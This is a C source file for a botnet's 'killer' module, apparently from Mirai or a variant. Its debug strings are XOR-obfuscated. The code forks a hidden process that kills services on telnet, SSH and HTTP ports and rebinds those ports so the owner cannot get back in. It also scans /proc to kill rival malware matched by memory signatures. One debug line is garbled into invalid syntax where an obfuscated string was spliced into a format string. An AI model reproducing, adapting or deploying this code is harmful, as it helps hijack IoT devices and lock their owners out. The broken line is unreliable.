#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    // Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x5E\x78\x73\x63\x64\x6D\x2A\x7E\x65\x2A\x61\x63\x66\x66\x2A\x7A\x65\x78\x7E\x2A\x38\x39\x00\x0A", 33));
#endif
    if (killer_kill_by_port(htons(23)))
    {
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x41\x63\x66\x66\x6F\x6E\x2A\x7E\x69\x7A\x25\x38\x39\x2A\x22\x7E\x6F\x66\x64\x6F\x7E\x23\x00\x0A", 33));
#endif
    } else {
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x61\x63\x66\x66\x2A\x7A\x65\x78\x7E\x2A\x38\x39\x00\x0A", 33));
#endif
    }
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x48\x65\x7F\x64\x6E\x2A\x7E\x65\x2A\x7E\x69\x7A\x25\x38\x39\x2A\x22\x7E\x6F\x66\x64\x6F\x7E\x23\x00\x0A", 35));
#endif
#endif

    // Kill SSH service and prevent it from restarting
#ifdef KILLER_REBIND_SSH
    if (killer_kill_by_port(htons(22)))
    {
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x41\x63\x66\x66\x6F\x6E\x2A\x7E\x69\x7A\x25\x38\x38\x2A\x22\x59\x59\x42\x23\x00\x0A", 30));
#endif
    }
    tmp_bind_addr.sin_port = htons(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x48\x65\x7F\x64\x6E\x2A\x7E\x65\x2A\x7E\x69\x7A\x25\x38\x38\x2A\x22\x59\x59\x42\x23\x00\x0A", 32));
#endif
#endif

    // Kill HTTP service and prevent it from restarting
#ifdef KILLER_REBIND_HTTP
    if (killer_kill_by_port(htons(80)))
    {
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x41\x63\x66\x66\x6F\x6E\x2A\x7E\x69\x7A\x25\x32\x3A\x2A\x22\x62\x7E\x7E\x7A\x23\x00\x0A", 31));
#endif
    }
    tmp_bind_addr.sin_port = htons(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x48\x65\x7F\x64\x6E\x2A\x7E\x65\x2A\x7E\x69\x7A\x25\x32\x3A\x2A\x22\x62\x7E\x7E\x7A\x23\x00\x0A", 33));
#endif
#endif

    // In case the binary is getting deleted, we want to get the REAL realpath
    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
    {
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x47\x6B\x69\x62\x63\x64\x6F\x2A\x6E\x65\x6F\x79\x2A\x64\x65\x7E\x2A\x62\x6B\x7C\x6F\x2A\x25\x7A\x78\x65\x69\x25\x2E\x7A\x63\x6E\x25\x6F\x72\x6F\x00\x0A", 47));
#endif
        return;
    }
#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x47\x6F\x67\x65\x78\x73\x2A\x79\x69\x6B\x64\x64\x63\x64\x6D\x2A\x7A\x78\x65\x69\x6F\x79\x79\x6F\x79\x00\x0A", 36));
#endif

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
#ifdef DEBUG
            printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x65\x7A\x6F\x64\x2A\x25\x7A\x78\x65\x69\x2B\x00\x0A", 32));
#endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
#ifdef DEBUG
                    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x2F\x6E\x2A\x79\x6F\x69\x65\x64\x6E\x79\x2A\x62\x6B\x7C\x6F\x2A\x7A\x6B\x79\x79\x6F\x6E\x2A\x79\x63\x64\x69\x6F\x2A\x66\x6B\x79\x7E\x2A\x79\x69\x6B\x64\x24\x2A\x58\x6F\x27\x79\x69\x6B\x64\x64\x63\x64\x6D\x2A\x6B\x66\x66\x2A\x7A\x78\x65\x69\x6F\x79\x79\x6F\x79\x2B\x00\x0A", 77), KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);

            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

            // Store /proc/$pid/status into status_path
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);

            // Resolve exe_path (/proc/$pid/exe) -> realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                table_unlock_val(TABLE_KILLER_ANIME);
                // If path contains (char*)util_decrypt("\x24\x6B\x64\x63\x67\x6F\x0A", 7) kill.
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                {
                    unlink(realpath);
                    kill(pid, 9);
                }
                table_lock_val(TABLE_KILLER_ANIME);

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x5A\x78\x65\x69\x6F\x79\x79\x2A\x2D\x2F\x79\x2D\x2A\x62\x6B\x79\x2A\x6E\x6F\x66\x6F\x7E\x6F\x6E\x2A\x68\x63\x64\x6B\x78\x73\x2B\x00\x0A", 43), realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
#ifdef DEBUG
                printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x47\x6F\x67\x65\x78\x73\x2A\x79\x69\x6B\x64\x2A\x67\x6B\x7E\x69\x62\x2A\x6C\x65\x78\x2A\x68\x63\x64\x6B\x78\x73\x2A\x2F\x79\x00\x0A", 42), exe_path);
#endif
                kill(pid, 9);
            } 

            /*
            if (upx_scan_match(exe_path, status_path))
            {
#ifdef DEBUG
                printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x5F\x5A\x52\x2A\x79\x69\x6B\x64\x2A\x67\x6B\x7E\x69\x62\x2A\x6C\x65\x78\x2A\x68\x63\x64\x6B\x78\x73\x2A\x2F\x79\x00\x0A", 39), exe_path);
#endif
                kill(pid, 9);
            }
            */

            // Don't let others memory scan!!!
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }

#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x63\x64\x63\x79\x62\x6F\x6E\x00\x0A", 19));
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x63\x64\x6E\x63\x64\x6D\x2A\x6B\x64\x6E\x2A\x61\x63\x66\x66\x63\x64\x6D\x2A\x7A\x78\x65\x69\x6F\x79\x79\x6F\x79\x2A\x62\x65\x66\x6E\x63\x64\x6D\x2A\x7A\x65\x78\x7E\x2A\x2F\x6E\x00\x0A", 56), ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);

    fd = open((char*)util_decrypt("\x25\x7A\x78\x65\x69\x25\x64\x6F\x7E\x25\x7E\x69\x7A\x0A", 14), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf((char*)util_decrypt("\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x6C\x63\x64\x6E\x2A\x63\x64\x65\x6E\x6F\x2A\x6C\x65\x78\x2A\x7A\x65\x78\x7E\x2A\x2F\x6E\x00\x0A", 34), ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }

#ifdef DEBUG
    printf((char*)util_decrypt("\x4C\x65\x7F\x64\x6E\x2A\x63\x64\x65\x6E\x6F\x2A\x56\x0A", 14)%s\(char*)util_decrypt("\x2A\x6C\x65\x78\x2A\x7A\x65\x78\x7E\x2A\x2F\x6E\x00\x0A", 14), inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), (char*)util_decrypt("\x25\x0A", 2));
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef DEBUG
                        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x65\x7F\x64\x6E\x2A\x7A\x63\x6E\x2A\x2F\x6E\x2A\x6C\x65\x78\x2A\x7A\x65\x78\x7E\x2A\x2F\x6E\x00\x0A", 35), util_atoi(pid, 10), ntohs(port));
#else
                        kill(util_atoi(pid, 10), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)
    {
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x65\x7A\x6F\x64\x22\x23\x00\x0A", 27));
#endif
        return FALSE;
    }
    close(fd);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4E\x6F\x7E\x6F\x69\x7E\x6F\x6E\x2A\x7D\x6F\x2A\x6B\x78\x6F\x2A\x78\x7F\x64\x64\x63\x64\x6D\x2A\x65\x7F\x7E\x2A\x65\x6C\x2A\x6A\x2F\x79\x6A\x00\x0A", 46), killer_realpath);
#endif
    }

    util_zero(path, ptr_path - path);

    return TRUE;
}

/*
static BOOL status_upx_check(char *exe_path, char *status_path)
{
    int fd, ret;

    if ((fd = open(exe_path, O_RDONLY)) != -1)
    {
        close(fd);
        return FALSE;
    }

    if ((fd = open(status_path, O_RDONLY)) == -1)
        return FALSE;

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = TRUE;
            break;
        }
    }

    //eyy

    close(fd);
    return FALSE;
}
*/

static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard;
    int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len;
    BOOL found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_QBOT);
    table_unlock_val(TABLE_MEM_QBOT2);
    table_unlock_val(TABLE_MEM_QBOT3);
    table_unlock_val(TABLE_MEM_UPX);
    table_unlock_val(TABLE_MEM_ZOLLARD);

    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &m_qbot_len);
    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &m_qbot2_len);
    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &m_qbot3_len);
    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &m_upx_len);
    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &m_zollard_len);

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_QBOT);
    table_lock_val(TABLE_MEM_QBOT2);
    table_lock_val(TABLE_MEM_QBOT3);
    table_lock_val(TABLE_MEM_UPX);
    table_lock_val(TABLE_MEM_ZOLLARD);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
